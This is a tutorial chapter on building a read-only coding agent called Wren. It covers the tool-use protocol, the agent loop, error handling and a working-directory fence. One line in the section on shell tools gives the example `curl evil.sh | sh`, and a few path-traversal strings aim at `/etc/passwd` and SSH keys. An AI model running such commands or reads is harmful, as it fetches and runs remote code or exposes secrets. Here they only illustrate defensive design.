# 02 · Tools: the agent loop

*Step 2 · October 2026*

## What we built

Wren can now look around your project. Ask "how does the agent handle Ctrl-C?" and it lists the files, searches for the right one, reads it, and answers from the actual code, citing `path:line`. It has three tools, all **read-only**: `list_files`, `read_file` and `search`. It can look, but not touch.

The headline, though, isn't the tools. It's the **agent loop**: about fifteen lines in `agent.py` that turn a chatbot into an agent. Everything else in this step is about making that loop safe and useful.

Try it, even without an API key:

```bash
wren --provider fake        # then type:  ls   read README.md   search def
```

The fake model understands those three commands, so you can watch real tools run and the loop go round, for free. With a real key, open Wren inside any project and ask it what the project does.

---

## Idea 1: the model never runs anything; it *asks*

"Tool use" sounds like the model reaches out and does things. It doesn't. It's a protocol, made entirely of messages, and the harness does all the doing. Here's a real exchange, simplified:

**① Wren sends** the conversation, plus a menu of tools:

```json
{
  "system": "You are Wren…",
  "tools": [
    {"name": "read_file", "description": "Read a text file in the project…",
     "input_schema": {"type": "object", "properties": {"path": {"type": "string"}}, "required": ["path"]}}
  ],
  "messages": [{"role": "user", "content": "What does main.py do?"}]
}
```

**② The model replies** with a request instead of an answer, and says why it stopped:

```json
{
  "stop_reason": "tool_use",
  "content": [
    {"type": "text", "text": "Let me read it."},
    {"type": "tool_use", "id": "toolu_01", "name": "read_file", "input": {"path": "main.py"}}
  ]
}
```

**③ Wren runs** `read_file(path="main.py")` itself, then sends the *whole* conversation again, now with the result in a new **user** message:

```json
{"role": "user", "content": [
  {"type": "tool_result", "tool_use_id": "toolu_01", "content": "     1\tdef main():\n     2\t    …"}
]}
```

**④ The model answers**, now that it has seen the file, with `stop_reason: "end_turn"`.

Three details are worth noticing:

- **The result goes in a *user* message.** As far as the API is concerned, there are only two parties. Anything that isn't the model is "the user", including Wren's tools.
- **The `id` ties a result to its request.** Every `tool_use` must be answered by a `tool_result` with the same id, in the very next message. Leave one unanswered and the API rejects the whole conversation.
- **The model chose what to do.** Wren never decided to read `main.py`; it offered a tool, and the model decided when and how to use it.

## Idea 2: the agent loop is the whole trick

Step ③ can repeat. After reading `main.py`, the model might want to search for where `main` is called, then read *that* file. So instead of one round trip per turn, Wren keeps going until the model stops asking. This is `Agent._loop`, lightly trimmed:

```python
for step in range(1, self.max_steps + 1):
    completed = yield from self._call_model()      # stream a reply
    reply = completed.message
    self.messages.append(reply)

    if not reply.tool_uses:                        # nothing requested?
        return TurnFinished(...)                   # the turn is done

    results = yield from self._run_tools(reply.tool_uses)
    self.messages.append(Message("user", results)) # ...and go round again
```

That's it. **An agent is a model, a set of tools, and a loop.** Everything impressive a coding agent does (exploring a codebase, fixing a bug, running the tests until they pass) is this loop going round many times, with the model deciding each step based on what the last one returned.

Two judgment calls in those lines:

- **We check for tool requests, not just `stop_reason`.** A reply cut off by the length limit has `stop_reason: "max_tokens"`, but can still contain a half-written tool request. Since every request must get a result, we look at the content itself. (A half-written request usually fails validation, which is fine: the model sees the error and tries again.)
- **There's a step limit** (`--max-steps`, default 25). A confused model could loop forever, spending your money. When the limit hits, Wren stops and says so; you can reply "continue". More on how it stops cleanly in Idea 7.

### Follow-up: no step limit by default

Since step 8 there's no limit unless you set one (D98). Escape stops a runaway turn at any point, which is the job the limit was standing in for, and a fixed 25 also stopped long tasks part-way through. `--max-steps N` still works, and 0 means no limit. The loop picks its counter accordingly:

```python
steps = range(1, self.max_steps + 1) if self.max_steps else itertools.count(1)
```

## Idea 3: a tool's description is a prompt

Look at what the model actually receives about a tool: `/tools read_file` shows you, exactly. It's a name, a paragraph of English and a JSON Schema. **That's all the model ever knows about it.** It never sees the Python.

So the description does real work. It decides whether the model reaches for the tool at the right moment, and uses it well. Good tool descriptions read like a note to a smart new colleague:

- **What it does, and what comes back.** `read_file` says the output has line numbers, and that the numbers aren't part of the file. Without that, a model might copy them into code.
- **When to use something else.** "If you don't know the exact path, use list_files or search first."
- **Examples, for anything fiddly.** `list_files` shows three glob patterns, because "`*` doesn't cross folders but `**/` does" is easy to get wrong.

Tool definitions also cost money: they're sent with **every** request. Wren's three come to about 2,400 characters (roughly 600 tokens), more than twice the size of the system prompt. That's fine for three tools; it's one reason harnesses with fifty tools start loading them on demand.

## Idea 4: errors are information, not crashes

What happens when the model asks for a file that doesn't exist? In a normal program, an exception. In an agent, **an error is just another result**: something for the model to read and react to. So `ToolRegistry.run` never raises. Every failure becomes a tool result marked `is_error`:

```
read_file(path='src/mian.py')
  ✗ No such file: src/mian.py. Use list_files to see what exists.
```

The model reads that, spots its typo or lists the folder, and carries on. That's why every `ToolError` message in Wren says what went wrong *and what to try next*. The audience is the model.

The same goes for bad arguments. The model *usually* sends arguments matching the schema, but not always: it might leave one out, misspell a name, or send `"10"` instead of `10`. `validation.py` checks every call and reports all the problems at once:

```
Invalid arguments: missing required argument 'path'; unknown argument 'file'.
(Accepted arguments: path, offset, limit.)
```

One Python trap turned up while writing it: `True` and `False` are integers in Python (`True == 1`), so a naive check accepts `{"limit": true}` as a number. JSON doesn't think booleans are numbers, so the validator handles that case explicitly.

## Idea 5: design tool output for a model to read

Two audiences watch every tool call: the model and you. They need different things, so a `ToolResult` carries both:

| | The model sees `content` | You see `summary` |
| --- | --- | --- |
| `read_file` | 120 numbered lines | `→ 120 lines` |
| `search` | every matching line, as `path:line: text` | `→ 7 matches in 3 files` |

The `content` side is designed around how the model works:

- **Line numbers** let it say "line 42" precisely, and, from step 3, point at the exact code it wants to change.
- **Paths are relative to the working directory**, the same form every tool accepts. The model can copy a path straight out of a `search` result into `read_file`.
- **Notes say what to do next.** A long file comes back with `[Showing lines 1-500 of 1,234. To read on, call read_file with offset=501.]`. The model has no other way to know there's more, so the output tells it.
- **Everything is capped.** Remember from step 1: the whole history is re-sent on every request. A 5,000-line file read once gets paid for again on *every later message* in the conversation. So each tool has its own limits (500 lines per read, 100 search matches), and the registry has a final safety net (50,000 characters).

## Idea 6: a fence around the working directory

Read-only isn't automatically harmless. A model that can read anything can read `~/.ssh/id_rsa`, then quote it back in a reply. So Wren's tools can only see inside the folder you started Wren in. Every path goes through one function, `files.resolve`:

```python
candidate = (ctx.root / path).resolve()     # collapse "..", follow symlinks
if not candidate.is_relative_to(ctx.root):
    raise ToolError(f"'{path}' is outside the working directory ...")
```

The order matters. **Resolve first, then check.** Checking the raw string would miss `src/../../etc/passwd`, and it would miss a symlink inside your project that points at a secret outside it. Resolving turns both into their real location, and *then* we check. The tests try all three escapes. `search` does the same check on every file it opens, since a folder can contain symlinks too.

This is one fence, not a security model. Step 3, where tools can change things, adds the real safety layer: asking you first.

## Idea 7: keeping the history valid got harder

Step 1 had one rule: between turns, the history is complete. With tools, "complete" means more, so the rules are now written down as code. `history_problems()` in `messages.py` checks them, and the tests run it after every scenario:

1. It starts with the user, and ends with the assistant.
2. Every `tool_use` is answered, by id, in the very next message.
3. No message is empty. The API rejects empty messages, and models occasionally return one, so the agent substitutes a placeholder.

Three places in the agent exist purely to keep those rules true:

- **Rollback covers the whole loop.** Ctrl-C after three tool calls discards all of them, not just the last. Otherwise the history could end on an unanswered tool request.
- **The step limit ends cleanly.** When Wren runs out of steps, the history ends with tool results, which breaks rule 1. So the agent appends a short bracketed note in the assistant's place: *"[Wren stopped this turn after 25 model calls…]"*. The rules hold, and next turn the model knows why it stopped.
- **Several tools, one message.** The model may ask for several tools in one reply. They run one at a time, and all the results go back together in a single user message, in order.

## Idea 8: dedicated tools, and the shell to come

We discussed this before building: why three narrow tools instead of one tool that runs any shell command? The industry answer is **both**. Claude Code and Gemini CLI have dedicated tools for reading, searching and editing, *plus* a shell tool for everything else (tests, git, builds), gated behind permission prompts. Some tools lean harder on the shell, and research agents have shown a bash-only agent can do surprisingly well.

Dedicated tools win where they fit, because they are:

- **Easy to judge.** `read_file` is obviously safe. Is `bash("cat a.txt; curl evil.sh | sh")`? You'd have to parse the shell to know.
- **Shaped for the model.** Line numbers, paging notes and caps are hard to get from `cat`.
- **Portable.** They work the same on Windows, macOS and Linux.

The shell wins on reach: no one can write a dedicated tool for every command. So Wren will have both, and the shell arrives in step 3, behind permission prompts.

## Idea 9: the duplication we're living with, for now

Look at how one fact, "`limit` is a whole number, at least 1, defaulting to 500", is spread across Wren:

- the JSON Schema in `read_file.py` says it, for the model;
- `validation.py` enforces it, by interpreting that schema at runtime;
- `run()` reads `args["limit"]`, and Python has no idea it's an int. Your editor can't autocomplete it, and a typo in `args["limt"]` is only found when it runs.

This works, and it's honest about what validation involves. But it's the kind of duplication that drifts. Step 3 opens by replacing it with **Pydantic**: each tool gets a small class that declares its arguments once. Pydantic generates the JSON Schema from it, validates the model's input against it, and hands `run()` a typed object. `validation.py` gets deleted. Pydantic is already installed, since the Anthropic SDK uses it. That refactor is your choice from this step: learn it by hand first, then move to the better-engineered version.

---

## Python worth knowing from this step

- **`yield from` with a return value.** `completed = yield from self._call_model()` passes every event from the inner generator up to our caller, then hands us the inner generator's `return` value. It's how the agent loop is split into small generator functions without losing the streaming.
- **Closing a generator.** When the REPL stops iterating (Ctrl-C), Python raises `GeneratorExit` inside the generator at the paused `yield`. That's why rollback catches `BaseException`, and why the agent yields its final `TurnFinished` *after* the rollback block. Abandoning a finished turn shouldn't undo it.
- **`Path.resolve()` and `is_relative_to()`.** The pair behind the working-directory fence.
- **`os.walk` pruning.** Assigning to `dirnames[:]` inside the loop tells `os.walk` which folders to skip. It's how `.git` and `node_modules` are never even entered.

## Known limits (on the list for later)

- `.gitignore` isn't read; a fixed list of folders is skipped instead.
- `search` is pure Python: fine for normal projects, slow on huge ones (ripgrep would fix that).
- While the model is writing a tool request, nothing shows on screen. A spinner is step 4's job.
- Tools run one at a time, even when the model asks for several at once.

## Things to try

1. In fake mode, run `ls`, then `/history`. Find the `tool_use` and its matching `tool_result`, and check the ids match.
2. `/tools read_file`: read it as the model would. What would you change?
3. `read ../../etc/passwd` in fake mode: watch the fence work, and see the model receive the error.
4. With a real key: run `wren --max-steps 2` in a big project and ask something hard. Then say "continue".
5. With a real key: ask "where is the step limit enforced, and what happens when it's hit?" and see whether it searches or lists first.

## What's next: step 3, acting safely

Step 3 lets Wren change things: an `edit_file` tool, and a shell tool for running tests and commands. Three things have to come with it:

1. **The Pydantic refactor** (Idea 9), so arguments are checked strictly before anything gets changed.
2. **Permission prompts:** Wren asks before anything risky runs, and you can say yes, no, or "yes to this kind of thing from now on".
3. **A rethink of rollback.** Right now, Ctrl-C discards the turn from the history, and that's honest because read-only tools changed nothing. Once a tool has edited a file, deleting the turn from the history doesn't undo the edit. The model would forget a change that really happened. We'll have to decide what an interrupted turn means when the world has moved on.
